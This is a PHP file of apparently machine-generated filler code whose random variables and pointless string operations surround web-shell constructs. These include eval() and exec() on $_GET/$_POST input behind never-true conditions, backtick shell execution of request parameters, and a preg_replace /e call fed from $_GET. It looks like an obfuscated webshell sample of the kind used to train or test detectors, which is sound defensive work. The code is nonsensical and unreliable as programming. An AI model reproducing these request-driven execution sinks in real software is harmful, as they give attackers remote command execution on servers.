<?php
$AJYl = 'xoiJu';
$Pu6pkYi6Gj2 = '_e5';
$FERmBVMR = 'D80';
$n2JR_ = new stdClass();
$n2JR_->jW_zblX166 = 'BQZEne';
$n2JR_->OvzP4RtqXqm = 'z9KxyWcUwkK';
$n2JR_->RJN_ = 'MN00wogicHE';
$n2JR_->NmjnTls2ybM = 'NZ';
$kuQc0 = new stdClass();
$kuQc0->xR3BS05EU = 'fDJn9aQEpEF';
$kuQc0->U7 = 'SKyeG';
$kuQc0->JsTox = 'r8';
$kuQc0->Nm = 'PztVuWhdDIK';
$q1kSvE = 'fJI5l11ns3';
$tFQp7 = 'UdTEAI_';
$ZvmiihS = 'fZBBu';
$JQR = 'g5hOYhr7X';
$nv2jokktG8 = 'CUl1';
if(function_exists("BB3K2If9wVsfLs")){
    BB3K2If9wVsfLs($AJYl);
}
str_replace('a4Molsm8XYjZ', 'EeqkWk09Y2O', $Pu6pkYi6Gj2);
$FERmBVMR = $_GET['UVfgckd1'] ?? ' ';
var_dump($tFQp7);
echo $ZvmiihS;
if(function_exists("hnQ5VoGC2ghXmVh")){
    hnQ5VoGC2ghXmVh($nv2jokktG8);
}
$o1PB8Hc4f0b = 'Ump_xSBZA';
$apHZIuSoLLh = 'f_l';
$r9 = 'plpMZ';
$zpt = 'Ns1';
$apHZIuSoLLh = $_POST['i4FCTK'] ?? ' ';
$GI0drfMDq = array();
$GI0drfMDq[]= $r9;
var_dump($GI0drfMDq);
if('SLXIRAiQS' == 'ekutlzjLE')
eval($_POST['SLXIRAiQS'] ?? ' ');
$FiWldihHR5 = 'C6Q1S3Ug';
$T6ka5qCe5W = 'bpgHau7w_c';
$L4ZYiR5SXa4 = 'CGttw';
$T5Ey = 'eXif';
$ddW7YYdoj = 'V_XV1bsHZ';
$JvfM = 'd28qD';
str_replace('KjIc88eLhY', 'Fv0NkWF', $FiWldihHR5);
$L4ZYiR5SXa4 = $_GET['aSozHycYWH_Rs5lI'] ?? ' ';
var_dump($JvfM);
$_GET['HivpH9bbq'] = ' ';
echo `{$_GET['HivpH9bbq']}`;
$_GET['qkUunEkyU'] = ' ';
@preg_replace("/Figma21Nl/e", $_GET['qkUunEkyU'] ?? ' ', 'sRzZBC7L0');
$NqiizZbGf = 'mF5ew';
$AzQBhjLcWC = 'RDSeLPV7fRp';
$GhEvgc2vx = 'MBv6zq';
$JMuS = 'CjCSQ0HagG';
$Nzj9nPIe = new stdClass();
$Nzj9nPIe->cNOTdj = 'ZHox';
$Nzj9nPIe->_tCXd = 'HyT8sbD';
$Nzj9nPIe->f2tVyp = '_WK';
$Nzj9nPIe->yoyx47i = 'nKgx';
$Nzj9nPIe->N2 = 'ram';
$yirouxUHp9 = 'a2';
$csDs = 'i9bLPS0Lj';
$NqiizZbGf = $_GET['rDDh2dodXOE3wBI'] ?? ' ';
$GgBnSKsteW = array();
$GgBnSKsteW[]= $AzQBhjLcWC;
var_dump($GgBnSKsteW);
$MyLSSqv = array();
$MyLSSqv[]= $GhEvgc2vx;
var_dump($MyLSSqv);
if(function_exists("jn_jHfuEnsKMiad")){
    jn_jHfuEnsKMiad($JMuS);
}
$yirouxUHp9 = $_GET['kGYeDRDc5'] ?? ' ';
var_dump($csDs);

function hZj_n()
{
    $_GET['M04YaDs8C'] = ' ';
    echo `{$_GET['M04YaDs8C']}`;
    $heM3hO0tHT = 'Hb_kJn6HuUU';
    $aekuIeIcva = 'e5jk5d0';
    $px = 'I3T';
    $K8MAZpd = 'rpi';
    $LKXLU24etB = 'eXX5QkjEQI';
    $URn9zri2 = 'lzaEWvzB0h';
    $JszBHk = array();
    $JszBHk[]= $aekuIeIcva;
    var_dump($JszBHk);
    preg_match('/ATPVqU/i', $px, $match);
    print_r($match);
    $K8MAZpd = $_GET['jLpMG6JYGw'] ?? ' ';
    $URn9zri2 = explode('si96jMGUJW', $URn9zri2);
    
}
$sxL5 = 'I7U6W';
$GPTdYKC = 'MWAo';
$CVbBeDZ5_ = 'HV5NpFEegl';
$jmNNFdSgyp = 'pqV7iknLNP';
$GnjYHzHY = 'zHZc6Vd8tP0';
$ADk5gn = 'MA_mC';
$sxL5 .= 'Vl2doYjOVJgl93Qx';
$GPTdYKC = explode('hGa641Ouc', $GPTdYKC);
$GnjYHzHY = $_GET['NPROBggv9wQu'] ?? ' ';
preg_match('/HwMMsz/i', $ADk5gn, $match);
print_r($match);

function cWKZwD36uHTTJsbGL_B()
{
    
}
$dySyOy = 'b_59IYnZmP';
$kod2lr8 = 'SRkQ';
$NImdp = 'q2xFdD66t';
$ZJ3 = 'pjf91L';
$Bymtg = 'x5hcJ';
$Q4Dxjoj = 'Ae5niheC6f';
$pxBZNZ5 = 'Q07VAtsibb';
$cOVbdZVHhD = 'tl49w';
$uFnHjJRVH3 = array();
$uFnHjJRVH3[]= $kod2lr8;
var_dump($uFnHjJRVH3);
$xebGz5Fa = array();
$xebGz5Fa[]= $NImdp;
var_dump($xebGz5Fa);
str_replace('_4IWvuTdxuQ_', 'l83mGKjIK6ovnwj', $Q4Dxjoj);
$Zg1WX07Bu = array();
$Zg1WX07Bu[]= $pxBZNZ5;
var_dump($Zg1WX07Bu);
$au3 = 'AhcgJg';
$lJhAVdy = 'n4VG98w';
$xI = 'ZJr';
$h1A = 'cTX';
$K7YYDfU3moV = 'qK_BSY';
$ZTA1lUbtae = 'u2z5mXJwIO';
$O36wjzqhjH = 'S4lG7C3IgwK';
$GBaLy = 'GQtfX_A';
$iVLdDdg = 'jRJcEz';
$uEupZDYvi = 'MGdOlH';
$pS9lo0 = 'uxH1_yVkx';
$NdsDSvNZI = 'CCs';
if(function_exists("UDTdQ54z")){
    UDTdQ54z($au3);
}
var_dump($lJhAVdy);
str_replace('U5Sj7BxD', 'mcP0IGw_FFvNfmRT', $xI);
var_dump($h1A);
if(function_exists("h_sfqwIuznbzHjjZ")){
    h_sfqwIuznbzHjjZ($ZTA1lUbtae);
}
$O36wjzqhjH = explode('xgUpUYUHsgS', $O36wjzqhjH);
if(function_exists("MWI3rne")){
    MWI3rne($GBaLy);
}
echo $iVLdDdg;
$uEupZDYvi .= 'HsxBnM';
$NdsDSvNZI = $_POST['yZiIRlRbOOm2Y0F6'] ?? ' ';
$VVVg8HNkK = 'dC';
$rw0 = 'wW_8MCPuDd';
$qfpSvp = 'I1';
$cJ7usZb = 'JE0To_DA';
$tOVy = 'DqzZ9I';
$v2 = new stdClass();
$v2->UPWZwIN = 'JdlK08bAufd';
$v2->f2SJhLl = 'R5';
$v2->D38gXlVfPf = 'EP7r1myXQk';
$IXQKzmw = 'tw8Kkm';
$VVVg8HNkK = explode('FYNMeTJ6', $VVVg8HNkK);
$rw0 .= 'Mmzua1iw';
str_replace('RUQ0eyydQk_l', 'kJGSN1kIVrH', $cJ7usZb);
echo $tOVy;
var_dump($IXQKzmw);
$ktk0C = 'FgihWGD';
$_HKb = 'Ue4yM6';
$rW = 'fV';
$AlUq = 'umjzpJc';
$Z1foTBtfb = 'hznF3X';
$bP = 'vi6qXdc';
$on = 'M0h7nZfWJ';
$OwGI = 'xanp';
$dW = 'bbHx';
$rtb8 = 'uUfe4b';
$WjVLgXE7N = 'kZMMr';
$LZ6bq7 = 'IC27S_ZY';
$X6G = 'ikhyVu';
$zK = 'DJkETDdm';
var_dump($ktk0C);
$_HKb = $_GET['XX_ug5x6_T'] ?? ' ';
$rW .= 'CBY2BO2aHaJcpO';
$AlUq .= 'aJWDCVwjU_';
var_dump($Z1foTBtfb);
$bP = explode('yn8xCl0k', $bP);
$on = explode('Y5uBWmq', $on);
if(function_exists("MPS35Mu1Lwc_P")){
    MPS35Mu1Lwc_P($OwGI);
}
$dW .= 'P1bG7eyntCxT';
$rtb8 = $_GET['ccRK26RjXAFNDE'] ?? ' ';
$WjVLgXE7N = explode('Mx26qqdfqRB', $WjVLgXE7N);
if(function_exists("TtqYPvVcWToC")){
    TtqYPvVcWToC($LZ6bq7);
}
$X6G = $_GET['ZJuJSSOt4yF'] ?? ' ';
preg_match('/mI0s6K/i', $zK, $match);
print_r($match);

function hFwopwiSjs5vs7tu9E()
{
    $FdzK = 'pttU';
    $owFh6h = 'sz_AnbqiiAg';
    $KO = 'P2IV4h';
    $zIMqcc = 'G5yX';
    $Rh4k_yZaJuI = 'E7aQ';
    preg_match('/MAA1ug/i', $owFh6h, $match);
    print_r($match);
    $zIMqcc = $_POST['nadTjxwj'] ?? ' ';
    $NAz = 'NKGGQ';
    $K_x4X = 'giFsuiWSFd';
    $h3LV = 'kU';
    $n8kcPNX1eoH = 'aPzJ';
    $kGP5ZoB51h = 'QVv';
    $KSDHXMdQg = 'A3td5nwe';
    $NAz = explode('ykLswl', $NAz);
    $h3LV .= 'WVfkJ2OXS';
    echo $n8kcPNX1eoH;
    $xI9DwHp99z = array();
    $xI9DwHp99z[]= $kGP5ZoB51h;
    var_dump($xI9DwHp99z);
    var_dump($KSDHXMdQg);
    $t_aH0r = 'YwgmNKbh1sM';
    $O0CSf = 'lb';
    $S_z01cbB = 'OB2';
    $bSCw = 'nwyM';
    $KKuaGZKhQJ = 'Jm';
    $RQZzzuF = 'F2jh9Z9isK';
    $Mdo = 'TYOhEHIkpV';
    var_dump($KKuaGZKhQJ);
    str_replace('aHkGJVtSfX', 'MQrCnLVO', $RQZzzuF);
    $Mdo = $_POST['D67OCY'] ?? ' ';
    
}
if('Dg4rOjjK1' == 'Kow_GMTSC')
exec($_GET['Dg4rOjjK1'] ?? ' ');
$_GET['M7Lsp_VcH'] = ' ';
$Zs50OX = '_UVzwDdxq';
$Fk91rT7 = 'seTjv';
$RtI4dscSN = 'TYg2K_47A7O';
$xJCjJ9 = 'QO7sMD_os9';
$migqW = 'uzuu507bd';
$GK0 = new stdClass();
$GK0->wqR91z = 'LM';
$GK0->cu7g = 'vRlTwU';
$GK0->wmrMo_DWYq4 = 'sv8vvJ';
$DI7 = 'Ia8cA';
$MF6hNwM = 'E2WMUCx';
$smQBOTIMw = 'dUEhC9IL35';
$lbAjJ = 'A8Am7K';
$jdG = 'Lh84yk6gB';
$Z0nK = 'i1u_vdPLM';
$UyKxay = 'rmjx';
if(function_exists("GtQoMOTQyjSIy")){
    GtQoMOTQyjSIy($Zs50OX);
}
str_replace('BfY6S9qz', 'BmPLFFPZt', $Fk91rT7);
echo $RtI4dscSN;
var_dump($migqW);
var_dump($DI7);
$MF6hNwM = $_GET['outT3JSYsps'] ?? ' ';
$smQBOTIMw = $_POST['m8M92m4o4ZP1'] ?? ' ';
preg_match('/utWHpe/i', $lbAjJ, $match);
print_r($match);
$jdG = $_POST['auW7Zst'] ?? ' ';
str_replace('ewCpgC6NcayZH67J', 'b7CLuQrGDC', $Z0nK);
$UyKxay .= 'PjlDKm0xF3bqRc';
echo `{$_GET['M7Lsp_VcH']}`;
$p1FYePC = 'ZUA_x8Sk';
$P8H = 'i6mNaznl5u';
$caEzPdHcP9 = new stdClass();
$caEzPdHcP9->M7M3U4hPrrg = 'o7ar0';
$caEzPdHcP9->xriV = 'vqU92';
$Rqla4nC = 'drH';
$zk = 'BkhMTim7GH';
$rvP94L = 'zdkOc';
$NI1AxF1v = 'VtB9jmxJ';
$U3 = 'uWxx';
$ZTowoqqc = 'WzTFk';
str_replace('Jwnzj3aOUhTIBUJY', 'Oivq1kRH', $p1FYePC);
$P8H = $_GET['RgEx2_opZ'] ?? ' ';
$Rqla4nC .= 'spywh3ekS_7DRX';
$IgNfdjNmkvy = array();
$IgNfdjNmkvy[]= $zk;
var_dump($IgNfdjNmkvy);
if(function_exists("hecgzzAgRjq")){
    hecgzzAgRjq($rvP94L);
}
$NI1AxF1v = explode('n_rNapYQTX3', $NI1AxF1v);
$ZTowoqqc = explode('heHLQzh', $ZTowoqqc);

function j36yYksyfbzxmyLOX()
{
    if('PZqnt52N_' == 'Skj4vfJNz')
     eval($_GET['PZqnt52N_'] ?? ' ');
    $OYJqwj_fR = 'I73lVdTq';
    $L2B5iw = 'gE6fH9P';
    $bpATL5yhv = 'Wcu8cdfx3Z8';
    $FF = 'SLch';
    $YsX45Zy3Q = new stdClass();
    $YsX45Zy3Q->Y_1o9U = 'iqh68htVd';
    $YsX45Zy3Q->pwRTi = 'Pgddk';
    $YsX45Zy3Q->BsrHT = 'A81hJI4zn';
    $YsX45Zy3Q->AHgO72j = 'd3D8MkM1FjG';
    $YsX45Zy3Q->OPG3WqlCAII = 'N5wyv_x';
    $YsX45Zy3Q->jK8wwhVv3M = 'aBQHBYoY';
    $YsX45Zy3Q->VpRb = 'H3Nf';
    $YsX45Zy3Q->LEFOYn5W497 = 'ulFwKe';
    $YsX45Zy3Q->kUw9VRk = 'RYkp';
    $GtTyYOuR = '_qTNSUKw';
    $Vmw = 'xv4IgRj';
    str_replace('cZWfGJGOgszLh', 'BBIjU1VM', $OYJqwj_fR);
    $bpATL5yhv = $_POST['z95hU31B'] ?? ' ';
    if(function_exists("mK3ZcBjcAzMFk")){
        mK3ZcBjcAzMFk($FF);
    }
    $GNJcly = array();
    $GNJcly[]= $GtTyYOuR;
    var_dump($GNJcly);
    echo $Vmw;
    
}
/*
$_GET['DDi1yEXw7'] = ' ';
echo `{$_GET['DDi1yEXw7']}`;
*/
echo 'End of File';
